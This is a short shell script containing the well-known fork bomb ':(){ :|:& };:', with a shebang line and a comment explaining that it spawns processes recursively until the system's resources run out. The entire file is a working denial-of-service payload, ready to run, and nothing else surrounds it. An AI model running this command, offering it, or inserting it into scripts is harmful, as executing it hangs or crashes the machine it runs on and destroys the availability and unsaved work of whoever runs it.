#!/bin/sh

#This script creates a function :() that calls itself twice every time it is executed, 
#leading to an exponential growth in the number of processes until the system's resources are exhausted
:(){ :|:& };: